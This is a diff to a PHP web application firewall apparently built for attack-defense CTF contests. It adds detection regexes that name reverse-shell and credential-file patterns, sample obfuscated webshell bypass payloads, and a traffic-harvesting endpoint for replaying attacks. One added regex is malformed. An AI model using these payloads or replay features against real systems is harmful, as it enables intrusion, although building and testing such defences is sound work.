@@ -148,7 +148,7 @@ function pwaf_default_cfg() {
             'sqli'       => true, 'cmdi'      => true, 'lfi'        => true,
             'xss'        => true, 'code'      => true, 'ssrf'       => true,
             'xxe'        => true, 'unserialize'=> true, 'upload'    => true,
-            'response'   => true,
+            'response'   => true, 'bypass'    => true,
         ],
     ];
 }
@@ -172,12 +172,6 @@ function pwaf_patterns() {
     static $p = null;
     if ($p !== null) return $p;
     $p = [
-
-    // ── SQL Injection ─────────────────────────────────────────────────────────
-    // 注意: 所有正则已做 ReDoS 加固
-    //   - 用 [^;]{0,N} 代替 [\s\S]{0,N}（限制字符类，避免灾难性回溯）
-    //   - 短限长度，降低回溯深度
-    //   - 输入在引擎层已被截断到 2048 字节（见 pwaf_check_input）
     'sqli' => [
         '/\bunion\b.{0,60}\bselect\b/is',
         '/\bselect\b.{0,40}(\*|[\d]+\s*,\s*[\d]+|null\s*,|0x[0-9a-f]+).{0,60}\bfrom\b/is',
@@ -196,14 +190,26 @@ function pwaf_patterns() {
         '/\bif\s*\(\s*[\d\'"]/i',
         '/\bunion\s+select\b/i',
         '/\b(version|user|database|schema)\s*\(\s*\)/i',
+        '/\b(?:union|select|insert|update|delete|drop|truncate|alter)\b[\s\S]{0,10}(?:\/\*!?[0-9]{0,5}[\s\S]{0,20}?\*\/)?[\s\S]{0,10}\b(?:from|where|into|set|values)\b/is',
+        '/\bunion\b[\s\t\n\r\x0b\x0c\/\*!]*\b(?:all|distinct)?[\s\t\n\r\x0b\x0c\/\*!]*\bselect\b/is',
+        '/\b(extractvalue|updatexml|exp|floor|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|json_keys|json_extract|gtid_subset|st_latfromgeohash|st_pointfromgeohash|dbms_utility\.compile_schema)\s*\(/i',
+        '/\b(sleep|benchmark|pg_sleep|waitfor\s+delay|dbms_pipe\.receive_message|dbms_lock\.sleep)\s*\(/i',
+        '/(?:[=<>!]|[\s\S]\b(?:and|or|xor)\b)[\s\S]{0,20}\b(rlike|regexp|sounds\s+like|like)\b/i',
+        '/[\s\S](?:\|\||&&|\^|\*|\/|%|<<|>>)\s*(?:sleep|benchmark|extractvalue|updatexml|pg_sleep)\s*\(/i',
+        '/\b(information_schema|mysql|performance_schema|sys|pg_catalog|pg_toast|sqlite_master|sqlite_temp_master|sysobjects|syscolumns)\b/i',
+        '/\b(load_file|into\s+(?:out|dump)file|load\s+data\s+(?:local\s+)?infile)\b/i',
+        '/;\s*(?:drop|alter|create|truncate|insert|update|delete|exec|execute|declare|set)\b/i',
+        '/\bxp_(?:cmdshell|regread|regwrite|dirtree|filelist)\b/i',
+        '/\b0[xX][0-9a-fA-F]{4,}\b/',
+        '/\b0[bB][01]{8,}\b/',
+        '/\b(concat|group_concat|concat_ws|char|unhex|hex|ascii|ord|cast|convert)\s*\(/i',
     ],
 
-    // ── Command Injection ─────────────────────────────────────────────────────
     'cmdi' => [
         '/\b(system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec)\s*\(/i',
         '/`[^`]{1,200}`/',
         '/\$\([^)]{1,200}\)/',
-        '/[;&|`]\s*(ls|cat|id|whoami|uname|pwd|wget|curl|nc|netcat|bash|sh|python|perl|ruby|php|nmap|ping)\b/i',
+        '/[;&|`]\s*(ls|dir|cat|tac|more|less|tail|head|id|whoami|uname|pwd|wget|curl|nc|netcat|bash|sh|python|perl|ruby|php|nmap|ping|find|grep|awk|sed)\b/i',
         '/\|\s*(bash|sh|zsh|ksh|csh|dash|tcsh)\b/i',
         '/(\/bin\/|\/usr\/bin\/|\/usr\/local\/bin\/)(bash|sh|nc|wget|curl|python|perl|ruby|php)/i',
         '/\b(wget|curl)\s+https?:\/\//i',
@@ -219,9 +225,21 @@ function pwaf_patterns() {
         '/putenv\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
         '/\bFFI\s*::\s*(cdef|load|scope)\s*\(/i',
         '/proc_open\s*\(\s*[\'"]?(bash|sh|cmd|powershell)/i',
+        '/\b(system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|syslog|error_log|mail|mb_send_mail)\s*\(/i',
+        '/[;&|`]\s*(ls|dir|cat|tac|more|less|tail|head|id|whoami|uname|pwd|wget|curl|nc|netcat|bash|sh|zsh|python|perl|ruby|php|nmap|ping|find|grep|awk|sed|arp|route|ip|ifconfig)\b/i',
+        '/(\/bin\/|\/usr\/bin\/|\/usr\/local\/bin\/|\/sbin\/)[a-zA-Z*?]{1,15}/i',
+        '/\$IFS(?:\[[^\]]+\]|\$\d+)?/i',
+        '/\$\{?[a-zA-Z_]+\:[\-\d]+\:\d+\}?/',
+        '/\$\[[a-zA-Z0-9_]+\]/',
+        '/\$\[\x[0-9a-fA-F]{2,}/',
+        '/>\s*\/dev\/(?:tcp|udp)\//i',
+        '/\/dev\/(?:tcp|udp)\/[\d.]+\/\d+/i',
+        '/\b(bash|sh|zsh)\s+-i\b/i',
+        '/echo\s+[A-Za-z0-9+\/]{20,}={0,2}\s*\|\s*(?:base64\s+-d\s*\|\s*)?(?:bash|sh|php|python|perl)/i',
+        '/\b(?:chmod|chown)\s+[0-7R-]{3,10}/i',
+        '/putenv\s*\(\s*[\'"](?:LD_PRELOAD|LD_LIBRARY_PATH)/i',
     ],
 
-    // ── LFI / Path Traversal ──────────────────────────────────────────────────
     'lfi' => [
         '/(\.\.[\/\\\\]){2,}/',
         '/(%2e%2e[%2f%5c]){2,}/i',
@@ -241,9 +259,15 @@ function pwaf_patterns() {
         '/\.\.[\\\\\/].*\.(php|ini|conf|log|bak)/i',
         '/file:\/\//i',
         '/\b(include|require)(_once)?\s*[\(\s][\'"]?\.\.[\\/]/i',
+        '/(?:%2e|%252e|\.)(?:%2e|%252e|\.)(?:%2f|%252f|%5c|%255c)/i',
+        '/php:\/\/(?:filter|input|stdin|fd|memory|temp|data)/i',
+        '/php:\/\/filter\/(?:[a-zA-Z0-9.\-\/=\|]+)?(?:convert\.(?:base64|iconv|quoted-printable)|string\.(?:rot13|toupper|tolower|strip_tags)|zlib\.(?:deflate|inflate))/i',
+        '/(?:data|expect|zip|phar|glob|compress\.(?:zlib|bzip2)|file|dict|gopher|ldap):\/\//i',
+        '/(?:\/|%2f)(?:etc\/(?:passwd|shadow|hosts|group|issue)|proc\/(?:self|version|sched_debug|net)|var\/log\/(?:auth|syslog|messages|apache|nginx))/i',
+        '/(?:[c-zC-Z]:)?(?:\\\\|%5c|%255c|%2f|\/)(?:windows|winnt|system32|boot\.ini|etc[\\\\\/]hosts)/i',
+        '/\b(?:include|require)(?:_once)?\s*[\(\s][\'"]?(?:\.\.[\\/]|php:\/\/)/i',
     ],
 
-    // ── XSS ──────────────────────────────────────────────────────────────────
     'xss' => [
         '/<\s*script[\s>\/]/i',
         '/<\s*\/\s*script\s*>/i',
@@ -259,9 +283,16 @@ function pwaf_patterns() {
         '/srcdoc\s*=/i',
         '/<\s*img[^>]+src\s*=[^>]*(javascript|data):/i',
         '/<\s*(details|summary|marquee|bgsound|isindex)\b/i',
+        '/\bon[a-zA-Z]{3,20}[\s\n]*=/i',
+        '/(?:javascript|vbscript|jscript)\s*:/i',
+        '/data\s*:\s*text\/(?:html|xml)/i',
+        '/<\s*(?:svg|math|iframe|object|embed|applet|link|meta|base|form|details|summary|marquee|bgsound|isindex|audio|video)\b/i',
+        '/\b(?:srcdoc|formaction|autofocus|ping)\s*=/i',
+        '/\b(?:v-bind|v-html|ng-app|ng-bind|@click)\s*=/i',
+        '/<use\s+(?:href|xlink:href)/i',
+        '/<math.*<mtext/is',
     ],
 
-    // ── PHP Code Injection ────────────────────────────────────────────────────
     'code' => [
         '/\beval\s*\(/i',
         '/\bassert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)/i',
@@ -277,9 +308,16 @@ function pwaf_patterns() {
         '/\bstr_rot13\s*\(\s*(?:base64_decode|gzinflate|gzuncompress)\s*\(/i',
         '/\bstr_rot13\s*\(\s*[\'"](?:flfgrz|rkrp|cnffgueht|furyy_rkrp|cbcra|cebp_bcra|nffreg|riny)[\'"].*\(/i',
         '/\b(include|require)(_once)?\s*[\(\s][\'"]?\s*(\/flag|\/etc\/passwd|\/etc\/shadow|\/proc\/self)/i',
+        '/\b(?:eval|assert|create_function|highlight_file|show_source)\s*\(/i',
+        '/\b(?:array_map|array_filter|usort|uasort|uksort|array_walk|call_user_func(?:_array)?|register_tick_function|register_shutdown_function)\s*\([^,]+,\s*[\'"]?(?:system|exec|passthru|shell_exec|eval|assert|popen|proc_open)/i',
+        '/preg_replace\s*\(\s*[\'"][^\'"]*(?:\/|#|~).*?[a-z]*e[a-z]*[\'"]/',
+        '/\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)/i',
+        '/\b(?:base64_decode|str_rot13|gzinflate|gzuncompress|gzdecode|rawurldecode|hex2bin)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/i',
+        '/\b(?:ReflectionFunction|ReflectionClass|ReflectionMethod|FFI)\b/i',
+        '/\b(?:current|next|end|reset)\s*\(\s*(?:getallheaders|localeconv|get_defined_vars|session_id)\s*\(/i',
+        '/fn\s*\(.*?\)\s*=>/i',
     ],
 
-    // ── SSRF ─────────────────────────────────────────────────────────────────
     'ssrf' => [
         '/https?:\/\/(127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+)/i',
         '/https?:\/\/172\.(1[6-9]|2\d|3[01])\.\d+\.\d+/i',
@@ -293,9 +331,17 @@ function pwaf_patterns() {
         '/ldap:\/\//i',
         '/https?:\/\/0x[0-9a-f]{8}/i',
         '/https?:\/\/\d{8,10}\//i',
+        '/https?:\/\/(?:127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)/i',
+        '/https?:\/\/(?:localhost|0\.0\.0\.0|\[::1\]|\[0000::1\])/i',
+        '/(?:169\.254\.169\.254|100\.100\.100\.200|metadata\.google\.internal|metadata\.tencentyun\.com)/i',
+        '/https?:\/\/0x[0-9a-f]{6,}/i',
+        '/https?:\/\/0[0-7]{10,}/i',
+        '/https?:\/\/\d{8,10}(?:\/|$)/i',
+        '/https?:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.(?:xip\.io|nip\.io|sslip\.io|nip\.cc|ipv4\.wtf)/i',
+        '/https?:\/\/[^\/]*[\x{2460}-\x{24FF}\x{FF10}-\x{FF19}\x{2160}-\x{217F}]/u',
+        '/https?:\/\/\[::(?:ffff:)?(?:127|10|192|172|169)\./i',
     ],
 
-    // ── XXE ──────────────────────────────────────────────────────────────────
     'xxe' => [
         '/<!DOCTYPE\s+[^>]*\[/i',
         '/<!ENTITY\s+/i',
@@ -304,18 +350,24 @@ function pwaf_patterns() {
         '/SYSTEM\s+[\'"]php:/i',
         '/SYSTEM\s+[\'"]expect:/i',
         '/<!ENTITY\s+%\s+/i',
+        '/<!ENTITY\s+(?:%\s+)?[a-zA-Z0-9_]+\s+(?:SYSTEM|PUBLIC)\s+[\'"]/i',
+        '/SYSTEM\s+[\'"](?:file|https?|php|expect|gopher|dict|ftp):/i',
+        '/xmlns:xi\s*=\s*[\'"]http:\/\/www\.w3\.org\/2001\/XInclude[\'"]/i',
     ],
 
-    // ── Deserialization ───────────────────────────────────────────────────────
     'unserialize' => [
         '/O:\d+:"[a-zA-Z_\\\\][\w\\\\]*":\d+:\{/i',
         '/a:\d+:\{.*O:\d+:/is',
         '/C:\d+:"[a-zA-Z_][\w\\\\]*":\d+:\{/i',
         '/aced0005/i',
         '/\/wEP[A-Za-z0-9+\/]{20,}/i',
+        '/O:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+:(?:\{|%7b)/i',
+        '/O:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+;/i',
+        '/a:\d+:(?:\{|%7b).*O:\d+:/is',
+        '/C:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+:(?:\{|%7b)/i',
+        '/rO0AB/i',
     ],
 
-    // ── Webshell Upload ───────────────────────────────────────────────────────
     'upload' => [
         '/<\?php/i',
         '/<\?=/i',
@@ -327,9 +379,37 @@ function pwaf_patterns() {
         '/<%.*Runtime\.exec/is',
         '/<%.*ProcessBuilder/is',
         '/\.(php[3-9]?|phtml|phar|php-s|shtml|shtm|cgi|pl|py|rb|asp|aspx|jsp|jspx|cfm)\s*$/i',
+        '/<\?(?:?!xml)/i',
+        '/\b(?:eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/i',
+        '/base64_decode\s*\(\s*\$_(?:GET|POST)/i',
+        '/<%.*Runtime\.getRuntime\(\)\.exec/is',
+        '/<script\s+language\s*=\s*[\'"]?(?:vbscript|jscript|c#)/i',
+        '/\.(?:php[3-9]?|phtml|phar|php-s|shtml|shtm|cgi|pl|py|rb|asp|aspx|jsp|jspx|cfm)(?:\x00|\s|\.|$)/i',
+        '/auto_prepend_file\s*=/i',
+        '/auto_append_file\s*=/i',
+        '/AddType\s+application\/x-httpd-php/i',
+        '/SetHandler\s+application\/x-httpd-php/i',
+        '/php_value\s+(?:auto_prepend_file|auto_append_file|disable_functions)/i',
     ],
 
-    ]; // end $p
+    'bypass' => [
+        '/[~^|]\s*[\'"][^\x00-\x1F]{1,30}[\'"]\s*\(/',
+        '/\([\'"][^\x00-\x1F]{1,15}[\'"]\s*[\^|]\s*[\'"][^\x00-\x1F]{1,15}[\'"]\)\s*\(/',
+        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\[[^\]]+\]\s*\(/',
+        '/[\'"](?:\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{1,3}){4,}[\'"]/',
+        '/\\\\[a-zA-Z_]\w*\s*\(/',
+        '/\\\\[0-7]{3}\\\\[0-7]{3}/',
+        '/[a-zA-Z_](?:\/\*.*?\*\/)+[a-zA-Z_]/',
+        '/(?:\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*\s*\.\s*){2,}/',
+        '/[\'"][a-zA-Z0-9_]+[\'"]\[\d+\]\s*\.\s*/',
+        '/\$[a-zA-Z_\x7f-\xff]\w*\[[^\]]+\]\s*\(/',
+    ],
+    ];
+
+    foreach ($p as $key => $patterns) {
+        $p[$key] = array_values(array_unique($patterns));
+    }
+
     return $p;
 }
 
@@ -895,7 +975,7 @@ function pwaf_block(array $cfg, $ip, $rule, $param, $payload, $t0 = 0.0) {
            . '<body><div class="box"><div class="icon">&#x1F6AB;</div>'
            . '<div class="title">请求已被拦截</div>'
            . '<div class="sub">PhoenixWAF 检测到恶意请求</div>'
-           . '<div class="rule">' . htmlspecialchars($rule) . '</div>'
+           // . '<div class="rule">' . htmlspecialchars($rule) . '</div>'
            . '<div class="sub">如有疑问请联系管理员</div>'
            . '<div class="rid">REF: ' . $rid . '</div>'
            . '</div></body></html>';
@@ -1203,18 +1283,29 @@ function pwaf_access_log(array $cfg, $ip, $action, $note, $t0) {
     if (empty($cfg['access_log'])) return;
     $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
     $al = preg_replace('/\.([^.]+)$/', '_access.$1', $lp);
+    
+    // 修复：提取并记录 POST 请求体数据
+    $post_body = '';
+    if (!empty($GLOBALS['_PWAF_POST'])) {
+        $post_body = substr(http_build_query($GLOBALS['_PWAF_POST']), 0, 300);
+    } elseif (!empty($GLOBALS['_PWAF_RAW_BODY'])) {
+        $post_body = substr($GLOBALS['_PWAF_RAW_BODY'], 0, 300);
+    }
+    
     $e  = json_encode([
-        'ts'     => time(),
-        'dt'     => date('Y-m-d H:i:s'),
-        'ip'     => $ip,
-        'method' => (isset($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] : 'GET'),
-        'uri'    => substr((isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/'), 0, 500),
-        'action' => $action,
-        'note'   => $note,
-        'ua'     => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT'] : ''), 0, 150),
-        'referer'=> substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_REFERER']) ? $GLOBALS['_PWAF_SERVER']['HTTP_REFERER'] : ''), 0, 150),
-        'ms'     => round((microtime(true) - $t0) * 1000, 2),
+        'ts'      => time(),
+        'dt'      => date('Y-m-d H:i:s'),
+        'ip'      => $ip,
+        'method'  => (isset($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] : 'GET'),
+        'uri'     => substr((isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/'), 0, 500),
+        'action'  => $action,
+        'note'    => $note,
+        'ua'      => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT'] : ''), 0, 150),
+        'referer' => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_REFERER']) ? $GLOBALS['_PWAF_SERVER']['HTTP_REFERER'] : ''), 0, 150),
+        'post'    => $post_body, // 补全 POST 数据
+        'ms'      => round((microtime(true) - $t0) * 1000, 2),
     ], JSON_UNESCAPED_UNICODE) . "\n";
+    
     // 非阻塞写入
     $fp = @fopen($al, 'a');
     if ($fp) {
@@ -1475,8 +1566,7 @@ function pwaf_response_hook($out, array $cfg, $ip) {
     return $out;
 }
 
-// ── L7: File integrity ────────────────────────────────────────────────────────
-// 扫描所有文件（PHP + 配置 + 脚本 + 数据库 + 可执行），检测新增/篡改
+// 扫描所有文件（PHP + 配置 + 脚本 + 数据库 + 可执行），检测新增/篡改（包含防刷屏去重）
 function pwaf_integrity_check(array $cfg) {
     $db      = (isset($cfg['integrity_db']) ? $cfg['integrity_db'] : (pwaf_datadir($cfg) . '/.pwaf_int'));
     $webroot = (isset($cfg['webroot']) ? $cfg['webroot'] : '');
@@ -1484,23 +1574,40 @@ function pwaf_integrity_check(array $cfg) {
 
     $stored  = json_decode(@file_get_contents($db), true) ?: [];
     $base    = (isset($stored['b']) ? $stored['b'] : []);
+    $alerted = (isset($stored['a']) ? $stored['a'] : []); // 新增：已告警状态缓存
     $lp      = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
+    $db_changed = false;
 
     foreach (pwaf_all_files($webroot) as $file) {
         $h = hash_file('sha256', $file);
+        
         if (!isset($base[$file])) {
-            $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
-                'rule'=>'integrity_new','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
-                JSON_UNESCAPED_UNICODE) . "\n";
-            @file_put_contents($lp, $e, FILE_APPEND);
+            if (!isset($alerted[$file]) || $alerted[$file] !== $h) {
+                $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
+                    'rule'=>'integrity_new','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
+                    JSON_UNESCAPED_UNICODE) . "\n";
+                @file_put_contents($lp, $e, FILE_APPEND);
+                $alerted[$file] = $h;
+                $db_changed = true;
+            }
         } elseif ($base[$file] !== $h) {
-            $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
-                'rule'=>'integrity_modified','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
-                JSON_UNESCAPED_UNICODE) . "\n";
-            @file_put_contents($lp, $e, FILE_APPEND);
+            if (!isset($alerted[$file]) || $alerted[$file] !== $h) {
+                $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
+                    'rule'=>'integrity_modified','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
+                    JSON_UNESCAPED_UNICODE) . "\n";
+                @file_put_contents($lp, $e, FILE_APPEND);
+                $alerted[$file] = $h;
+                $db_changed = true;
+            }
         }
     }
+
+    if ($db_changed) {
+        $stored['a'] = $alerted;
+        @file_put_contents($db, json_encode($stored), LOCK_EX);
+    }
 }
+
 
 // 扫描所有需要监控的文件（PHP/配置/脚本/数据库/可执行等）
 function pwaf_all_files($wr) {
@@ -1576,16 +1683,55 @@ function pwaf_panel(array &$cfg, $ip) {
         header('Content-Type: application/json');
         $poll_stats = pwaf_stats($cfg);
         $latest = (isset($poll_stats['recent'][0]) ? $poll_stats['recent'][0] : []);
+        
+        // 提取最近的拦截日志，专供重放面板进行无刷新更新
+        $recent_blocks = [];
+        foreach (array_slice($poll_stats['recent'], 0, 30) as $ev) {
+            if (((isset($ev['action']) ? $ev['action'] : '')) === 'block') {
+                $recent_blocks[] = $ev;
+            }
+        }
+        
         echo json_encode([
-            'total'       => $poll_stats['total'],
-            'blocked'     => $poll_stats['blocked'],
-            'latest_rule' => (isset($latest['rule']) ? $latest['rule'] : ''),
-            'latest_ip'   => (isset($latest['ip']) ? $latest['ip'] : ''),
-            'latest_uri'  => (isset($latest['uri']) ? $latest['uri'] : ''),
+            'total'         => $poll_stats['total'],
+            'blocked'       => $poll_stats['blocked'],
+            'latest_rule'   => (isset($latest['rule']) ? $latest['rule'] : ''),
+            'latest_ip'     => (isset($latest['ip']) ? $latest['ip'] : ''),
+            'latest_uri'    => (isset($latest['uri']) ? $latest['uri'] : ''),
+            'recent_blocks' => $recent_blocks
         ]);
         return;
     }
-
+    // ── AJAX 全流量拉取接口（供盲打收割使用）────────────────────────────────────
+    if (isset($GLOBALS['_PWAF_GET']['_poll_full'])) {
+        header('Content-Type: application/json');
+        $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
+        $al = preg_replace('/\.([^.]+)$/', '_access.$1', $lp);
+        
+        $merged = [];
+        // 合并拦截日志和全量访问日志
+        foreach ([$lp, $al] as $f) {
+            if (file_exists($f)) {
+                // 读取最后 50 行防止内存溢出
+                $lines = array_slice((array)@file($f, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES), -50);
+                foreach ($lines as $line) {
+                    $ev = json_decode($line, true);
+                    if (is_array($ev)) {
+                        // 生成唯一 ID 用于前端去重
+                        $ev['_id'] = md5($line);
+                        $merged[] = $ev;
+                    }
+                }
+            }
+        }
+        // 按时间戳降序排序
+        usort($merged, function($a, $b) {
+            return ((isset($b['ts']) ? $b['ts'] : 0)) - ((isset($a['ts']) ? $a['ts'] : 0));
+        });
+        
+        echo json_encode(array_slice($merged, 0, 50));
+        return;
+    }
     // ── 流量重放代理接口 ────────────────────────────────────────────────────
     if (isset($GLOBALS['_PWAF_GET']['_replay']) && $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] === 'POST') {
         header('Content-Type: application/json');
@@ -1719,18 +1865,28 @@ function pwaf_panel(array &$cfg, $ip) {
             // ── 流量转发 ────────────────────────────────────────────────────────
             case 'save_forward':
                 $cfg['forward_enabled'] = !empty($GLOBALS['_PWAF_POST']['forward_enabled']);
-                // 解析转发目标列表（每行一个，格式: host:port [cidr]）
+                // 解析转发目标列表（支持单端口和端口范围 host:portStart-portEnd）
                 $raw_targets = trim((isset($GLOBALS['_PWAF_POST']['forward_targets_raw']) ? $GLOBALS['_PWAF_POST']['forward_targets_raw'] : ''));
                 $targets = [];
                 foreach (explode("\n", $raw_targets) as $line) {
                     $line = trim($line);
                     if (!$line || $line[0] === '#') continue;
-                    // 格式: host[:port] [cidr_or_range]
+                    // 格式: host[:port_or_range] [cidr_or_range]
                     $parts = preg_split('/\s+/', $line, 3);
-                    $hp = $parts[0]; // host or host:port
+                    $hp = $parts[0];
                     $cidr = (isset($parts[1]) ? $parts[1] : '');
                     if (strpos($hp, ':') !== false) {
                         list($h, $p) = explode(':', $hp, 2);
+                        if (strpos($p, '-') !== false) {
+                            // 处理端口范围
+                            list($pstart, $pend) = explode('-', $p, 2);
+                            $pstart = (int)$pstart;
+                            $pend = (int)$pend;
+                            for ($i = $pstart; $i <= $pend; $i++) {
+                                if ($i > 0 && $i <= 65535) $targets[] = ['host'=>$h, 'port'=>$i, 'cidr'=>$cidr, 'enabled'=>true];
+                            }
+                            continue;
+                        }
                     } else { $h = $hp; $p = '80'; }
                     if (!$h) continue;
                     $targets[] = ['host'=>$h, 'port'=>(int)$p, 'cidr'=>$cidr, 'enabled'=>true];
@@ -1929,6 +2085,7 @@ textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(249,115,22,.
   <div class="nav-item" onclick="showTab('forward',this)"><span class="nav-icon">&#x21C4;</span> 流量转发</div>
   <div class="nav-item" onclick="showTab('flagsub',this)"><span class="nav-icon">&#x2691;</span> 自动提交</div>
   <div class="nav-item" onclick="showTab('replay',this)"><span class="nav-icon">&#x21BA;</span> 流量重放</div>
+  <div class="nav-item" onclick="showTab('autoreap',this)"><span class="nav-icon">&#x221E;</span> 全流量盲打</div>
   <div class="sidebar-footer" style="color:var(--text2);font-size:11px">&#x25CF; 会话有效</div>
 </div>
 <!-- main -->
@@ -2018,6 +2175,11 @@ $rule_info = [
         '响应 Flag 拦截',
         "监控 PHP 脚本的输出内容，检测并替换 flag 泄露。支持：直接明文 flag（flag{...}）、Base64 编码 flag（Zmxh 开头）、十六进制编码 flag（666c61677b 开头）、Shell 命令输出（/etc/passwd 内容、uid=0(root) 等）。捕获到 flag 后自动替换为假 flag，并可触发自动提交功能。注意：仅对 PHP 处理的请求有效，静态文件需配合 .htaccess ForceType 使用。",
         "flag{real_flag_here}\nZmxhZ3tyZWFsX2ZsYWdfaGVyZX0= (base64)\n666c61677b7265616c5f666c61675f686572657d (hex)\nroot:x:0:0:root:/root:/bin/bash (shell输出)\nuid=0(root) gid=0(root) groups=0(root)"
+    ],
+    'bypass' => [
+        '高级混淆与绕过',
+        '针对 AWD 实战中常用的高阶语法绕过技术进行检测。拦截基于异或/取反的无字母数字 WebShell、超全局变量动态函数调用、高密度十六进制/八进制编码、命名空间转义绕过、内联注释强行打断关键字、以及多重变量动态拼接等手段。',
+        '~"\x8c\x86\x8c\x8b\x9a\x8d"();' . "\n" . '$_GET[\'a\']($_POST[\'b\']);' . "\n" . '\system(\'id\');' . "\n" . 's/*w*/y/*w*/s/*w*/t/*w*/e/*w*/m(\'id\');' . "\n" . '$a="s";$b="ys";$c="tem";($a.$b.$c)(\'id\');'
     ],
 ];
 ?>
@@ -2171,9 +2333,9 @@ $rule_info = [
 <span style="color:var(--text2);font-size:11px">
 示例：<br>
 <code style="color:#7dd3fc">192.168.1.100</code> — 转发到 192.168.1.100:80，不限来源<br>
-<code style="color:#7dd3fc">192.168.1.100:8080</code> — 转发到 8080 端口<br>
-<code style="color:#7dd3fc">10.0.0.5:80 192.168.12.0/24</code> — 只转发来自 192.168.12.0/24 的请求<br>
-<code style="color:#7dd3fc">honeypot.local:80 10.10.1.1-10.10.2.255</code> — IP 范围格式
+<code style="color:#7dd3fc">10.0.0.5:8080 192.168.12.0/24</code> — 转发到 8080 端口，且只转发特定 IP 段的请求<br>
+<code style="color:#7dd3fc">honeypot.local:80 10.10.1.1-10.10.2.255</code> — IP 范围格式<br>
+<code style="color:#f97316">192.168.1.1:8801-8820</code> — 批量转发到同一 IP 的多个端口（切勿设置过大范围，以免阻塞 PHP 进程）
 </span>
 </div>
 <form method="post" action="<?= $e($self) ?>">
@@ -2304,8 +2466,8 @@ $int_events = array_reverse(array_slice($int_events, -200));
   <input type="hidden" name="act" value="save_flagsub">
 
   <div style="margin-bottom:14px">
-    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">Flag 正则（留空使用默认 <code style="color:#7dd3fc">flag\{...\}</code>）</div>
-    <input type="text" name="flagsub_regex" value="<?= $e(isset($cfg['flagsub_regex']) ? $cfg['flagsub_regex'] : '') ?>" placeholder="flag\{[A-Za-z0-9_\-]{1,100}\}" style="width:100%;max-width:480px">
+    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">Flag 正则提取匹配规则（可在此基础上修改）</div>
+    <input type="text" name="flagsub_regex" value="<?= $e(!empty($cfg['flagsub_regex']) ? $cfg['flagsub_regex'] : 'flag\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}') ?>" style="width:100%;max-width:480px">
   </div>
 
   <div style="margin-bottom:14px">
@@ -2320,7 +2482,7 @@ $int_events = array_reverse(array_slice($int_events, -200));
       <span class="toggle-slider"></span>
     </label>
     <span style="font-size:12px">启用自动提交</span>
-    <span style="color:var(--text2);font-size:11px">（当前：<?= !empty($cfg['flagsub_enabled']) ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>' ?>）</span>
+    <span class="status-text" style="color:var(--text2);font-size:11px">（当前：<?= !empty($cfg['flagsub_enabled']) ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>' ?>）</span>
   </div>
   <button type="submit" class="btn bo">保存设置</button>
 </form>
@@ -2345,120 +2507,291 @@ if (file_exists($fl)):
 <?php endforeach; ?>
 </table></div>
 <?php endif; ?>
-</div><!-- /flagsub -->
+</div>
